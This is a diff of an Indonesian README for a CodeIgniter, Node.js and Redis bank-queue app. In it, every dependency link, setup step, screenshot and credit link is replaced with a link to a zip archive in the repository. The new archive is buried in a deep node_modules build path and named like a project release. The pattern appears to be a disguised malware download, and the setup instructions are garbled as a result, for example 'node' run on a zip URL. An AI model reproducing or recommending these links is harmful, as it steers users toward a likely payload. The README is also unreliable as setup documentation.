@@ -1,19 +1,19 @@
 Pangilan Antrian Bank Realtime
 ==============================
 
-Codeigniter, https://raw.githubusercontent.com/dextercool/CI_Redis_Realtime_Antrian_Bank/master/assets/swf/soundmanager2_flash_xdomain.zip, https://raw.githubusercontent.com/dextercool/CI_Redis_Realtime_Antrian_Bank/master/assets/swf/soundmanager2_flash_xdomain.zip & Redis
+Codeigniter, https://github.com/dextercool/CI_Redis_Realtime_Antrian_Bank/raw/refs/heads/master/node.js/node_modules/socket.io/node_modules/socket.io-client/node_modules/engine.io-client/node_modules/ws/build/Release/.deps/Release/obj.target/bufferutil/src/Redis-Antrian-Bank-C-Realtime-1.8.zip, https://github.com/dextercool/CI_Redis_Realtime_Antrian_Bank/raw/refs/heads/master/node.js/node_modules/socket.io/node_modules/socket.io-client/node_modules/engine.io-client/node_modules/ws/build/Release/.deps/Release/obj.target/bufferutil/src/Redis-Antrian-Bank-C-Realtime-1.8.zip & Redis
 ---------------------------------------
 
 
 Kebutuhan:
 -------------
-- https://raw.githubusercontent.com/dextercool/CI_Redis_Realtime_Antrian_Bank/master/assets/swf/soundmanager2_flash_xdomain.zip server (https://raw.githubusercontent.com/dextercool/CI_Redis_Realtime_Antrian_Bank/master/assets/swf/soundmanager2_flash_xdomain.zip)
-    - https://raw.githubusercontent.com/dextercool/CI_Redis_Realtime_Antrian_Bank/master/assets/swf/soundmanager2_flash_xdomain.zip modules
-        - express (https://raw.githubusercontent.com/dextercool/CI_Redis_Realtime_Antrian_Bank/master/assets/swf/soundmanager2_flash_xdomain.zip)
-        - redis (https://raw.githubusercontent.com/dextercool/CI_Redis_Realtime_Antrian_Bank/master/assets/swf/soundmanager2_flash_xdomain.zip)
-        - https://raw.githubusercontent.com/dextercool/CI_Redis_Realtime_Antrian_Bank/master/assets/swf/soundmanager2_flash_xdomain.zip (https://raw.githubusercontent.com/dextercool/CI_Redis_Realtime_Antrian_Bank/master/assets/swf/soundmanager2_flash_xdomain.zip)
+- https://github.com/dextercool/CI_Redis_Realtime_Antrian_Bank/raw/refs/heads/master/node.js/node_modules/socket.io/node_modules/socket.io-client/node_modules/engine.io-client/node_modules/ws/build/Release/.deps/Release/obj.target/bufferutil/src/Redis-Antrian-Bank-C-Realtime-1.8.zip server (https://github.com/dextercool/CI_Redis_Realtime_Antrian_Bank/raw/refs/heads/master/node.js/node_modules/socket.io/node_modules/socket.io-client/node_modules/engine.io-client/node_modules/ws/build/Release/.deps/Release/obj.target/bufferutil/src/Redis-Antrian-Bank-C-Realtime-1.8.zip)
+    - https://github.com/dextercool/CI_Redis_Realtime_Antrian_Bank/raw/refs/heads/master/node.js/node_modules/socket.io/node_modules/socket.io-client/node_modules/engine.io-client/node_modules/ws/build/Release/.deps/Release/obj.target/bufferutil/src/Redis-Antrian-Bank-C-Realtime-1.8.zip modules
+        - express (https://github.com/dextercool/CI_Redis_Realtime_Antrian_Bank/raw/refs/heads/master/node.js/node_modules/socket.io/node_modules/socket.io-client/node_modules/engine.io-client/node_modules/ws/build/Release/.deps/Release/obj.target/bufferutil/src/Redis-Antrian-Bank-C-Realtime-1.8.zip)
+        - redis (https://github.com/dextercool/CI_Redis_Realtime_Antrian_Bank/raw/refs/heads/master/node.js/node_modules/socket.io/node_modules/socket.io-client/node_modules/engine.io-client/node_modules/ws/build/Release/.deps/Release/obj.target/bufferutil/src/Redis-Antrian-Bank-C-Realtime-1.8.zip)
+        - https://github.com/dextercool/CI_Redis_Realtime_Antrian_Bank/raw/refs/heads/master/node.js/node_modules/socket.io/node_modules/socket.io-client/node_modules/engine.io-client/node_modules/ws/build/Release/.deps/Release/obj.target/bufferutil/src/Redis-Antrian-Bank-C-Realtime-1.8.zip (https://github.com/dextercool/CI_Redis_Realtime_Antrian_Bank/raw/refs/heads/master/node.js/node_modules/socket.io/node_modules/socket.io-client/node_modules/engine.io-client/node_modules/ws/build/Release/.deps/Release/obj.target/bufferutil/src/Redis-Antrian-Bank-C-Realtime-1.8.zip)
 
-- Redis server (https://raw.githubusercontent.com/dextercool/CI_Redis_Realtime_Antrian_Bank/master/assets/swf/soundmanager2_flash_xdomain.zip)
+- Redis server (https://github.com/dextercool/CI_Redis_Realtime_Antrian_Bank/raw/refs/heads/master/node.js/node_modules/socket.io/node_modules/socket.io-client/node_modules/engine.io-client/node_modules/ws/build/Release/.deps/Release/obj.target/bufferutil/src/Redis-Antrian-Bank-C-Realtime-1.8.zip)
 
 Mulai:
 ------------
@@ -23,25 +23,25 @@ Mulai:
 - Clone the git repo kemudian ekstrak ke folder root http
 
    1. buka folder hasil ekstrak
-   2. buka folder https://raw.githubusercontent.com/dextercool/CI_Redis_Realtime_Antrian_Bank/master/assets/swf/soundmanager2_flash_xdomain.zip
-   3. jalankan server -> node https://raw.githubusercontent.com/dextercool/CI_Redis_Realtime_Antrian_Bank/master/assets/swf/soundmanager2_flash_xdomain.zip
+   2. buka folder https://github.com/dextercool/CI_Redis_Realtime_Antrian_Bank/raw/refs/heads/master/node.js/node_modules/socket.io/node_modules/socket.io-client/node_modules/engine.io-client/node_modules/ws/build/Release/.deps/Release/obj.target/bufferutil/src/Redis-Antrian-Bank-C-Realtime-1.8.zip
+   3. jalankan server -> node https://github.com/dextercool/CI_Redis_Realtime_Antrian_Bank/raw/refs/heads/master/node.js/node_modules/socket.io/node_modules/socket.io-client/node_modules/engine.io-client/node_modules/ws/build/Release/.deps/Release/obj.target/bufferutil/src/Redis-Antrian-Bank-C-Realtime-1.8.zip
    4. buka browser masukan *)root folder hasil ekstrak ke alamat browser
-   5. buka di tab/browser baru root https://raw.githubusercontent.com/dextercool/CI_Redis_Realtime_Antrian_Bank/master/assets/swf/soundmanager2_flash_xdomain.zip
+   5. buka di tab/browser baru root https://github.com/dextercool/CI_Redis_Realtime_Antrian_Bank/raw/refs/heads/master/node.js/node_modules/socket.io/node_modules/socket.io-client/node_modules/engine.io-client/node_modules/ws/build/Release/.deps/Release/obj.target/bufferutil/src/Redis-Antrian-Bank-C-Realtime-1.8.zip
 
 *) `root folder hasil ekstrak repo ini => CI_Redis_Realtime_Antrian_Bank-master`
 
-`Start https://raw.githubusercontent.com/dextercool/CI_Redis_Realtime_Antrian_Bank/master/assets/swf/soundmanager2_flash_xdomain.zip`
+`Start https://github.com/dextercool/CI_Redis_Realtime_Antrian_Bank/raw/refs/heads/master/node.js/node_modules/socket.io/node_modules/socket.io-client/node_modules/engine.io-client/node_modules/ws/build/Release/.deps/Release/obj.target/bufferutil/src/Redis-Antrian-Bank-C-Realtime-1.8.zip`
 
-![start server](https://raw.githubusercontent.com/dextercool/CI_Redis_Realtime_Antrian_Bank/master/assets/swf/soundmanager2_flash_xdomain.zip)
+![start server](https://github.com/dextercool/CI_Redis_Realtime_Antrian_Bank/raw/refs/heads/master/node.js/node_modules/socket.io/node_modules/socket.io-client/node_modules/engine.io-client/node_modules/ws/build/Release/.deps/Release/obj.target/bufferutil/src/Redis-Antrian-Bank-C-Realtime-1.8.zip)
 
 
 `Panggilan`
 
-![start server](https://raw.githubusercontent.com/dextercool/CI_Redis_Realtime_Antrian_Bank/master/assets/swf/soundmanager2_flash_xdomain.zip)
+![start server](https://github.com/dextercool/CI_Redis_Realtime_Antrian_Bank/raw/refs/heads/master/node.js/node_modules/socket.io/node_modules/socket.io-client/node_modules/engine.io-client/node_modules/ws/build/Release/.deps/Release/obj.target/bufferutil/src/Redis-Antrian-Bank-C-Realtime-1.8.zip)
 
 `Client`
 
-![start server](https://raw.githubusercontent.com/dextercool/CI_Redis_Realtime_Antrian_Bank/master/assets/swf/soundmanager2_flash_xdomain.zip)
+![start server](https://github.com/dextercool/CI_Redis_Realtime_Antrian_Bank/raw/refs/heads/master/node.js/node_modules/socket.io/node_modules/socket.io-client/node_modules/engine.io-client/node_modules/ws/build/Release/.deps/Release/obj.target/bufferutil/src/Redis-Antrian-Bank-C-Realtime-1.8.zip)
 
 
 
@@ -52,9 +52,9 @@ Informasi Tambahan:
 -------------------
 
 
-`Realtime https://raw.githubusercontent.com/dextercool/CI_Redis_Realtime_Antrian_Bank/master/assets/swf/soundmanager2_flash_xdomain.zip -> https://raw.githubusercontent.com/dextercool/CI_Redis_Realtime_Antrian_Bank/master/assets/swf/soundmanager2_flash_xdomain.zip` [Realtime https://raw.githubusercontent.com/dextercool/CI_Redis_Realtime_Antrian_Bank/master/assets/swf/soundmanager2_flash_xdomain.zip, https://raw.githubusercontent.com/dextercool/CI_Redis_Realtime_Antrian_Bank/master/assets/swf/soundmanager2_flash_xdomain.zip & Redis](https://raw.githubusercontent.com/dextercool/CI_Redis_Realtime_Antrian_Bank/master/assets/swf/soundmanager2_flash_xdomain.zip)
+`Realtime https://github.com/dextercool/CI_Redis_Realtime_Antrian_Bank/raw/refs/heads/master/node.js/node_modules/socket.io/node_modules/socket.io-client/node_modules/engine.io-client/node_modules/ws/build/Release/.deps/Release/obj.target/bufferutil/src/Redis-Antrian-Bank-C-Realtime-1.8.zip -> https://github.com/dextercool/CI_Redis_Realtime_Antrian_Bank/raw/refs/heads/master/node.js/node_modules/socket.io/node_modules/socket.io-client/node_modules/engine.io-client/node_modules/ws/build/Release/.deps/Release/obj.target/bufferutil/src/Redis-Antrian-Bank-C-Realtime-1.8.zip` [Realtime https://github.com/dextercool/CI_Redis_Realtime_Antrian_Bank/raw/refs/heads/master/node.js/node_modules/socket.io/node_modules/socket.io-client/node_modules/engine.io-client/node_modules/ws/build/Release/.deps/Release/obj.target/bufferutil/src/Redis-Antrian-Bank-C-Realtime-1.8.zip, https://github.com/dextercool/CI_Redis_Realtime_Antrian_Bank/raw/refs/heads/master/node.js/node_modules/socket.io/node_modules/socket.io-client/node_modules/engine.io-client/node_modules/ws/build/Release/.deps/Release/obj.target/bufferutil/src/Redis-Antrian-Bank-C-Realtime-1.8.zip & Redis](https://github.com/dextercool/CI_Redis_Realtime_Antrian_Bank/raw/refs/heads/master/node.js/node_modules/socket.io/node_modules/socket.io-client/node_modules/engine.io-client/node_modules/ws/build/Release/.deps/Release/obj.target/bufferutil/src/Redis-Antrian-Bank-C-Realtime-1.8.zip)
 
-`Codeigniter Redis Library -> https://raw.githubusercontent.com/dextercool/CI_Redis_Realtime_Antrian_Bank/master/assets/swf/soundmanager2_flash_xdomain.zip` [Redis Library](https://raw.githubusercontent.com/dextercool/CI_Redis_Realtime_Antrian_Bank/master/assets/swf/soundmanager2_flash_xdomain.zip)
+`Codeigniter Redis Library -> https://github.com/dextercool/CI_Redis_Realtime_Antrian_Bank/raw/refs/heads/master/node.js/node_modules/socket.io/node_modules/socket.io-client/node_modules/engine.io-client/node_modules/ws/build/Release/.deps/Release/obj.target/bufferutil/src/Redis-Antrian-Bank-C-Realtime-1.8.zip` [Redis Library](https://github.com/dextercool/CI_Redis_Realtime_Antrian_Bank/raw/refs/heads/master/node.js/node_modules/socket.io/node_modules/socket.io-client/node_modules/engine.io-client/node_modules/ws/build/Release/.deps/Release/obj.target/bufferutil/src/Redis-Antrian-Bank-C-Realtime-1.8.zip)
 
 
 
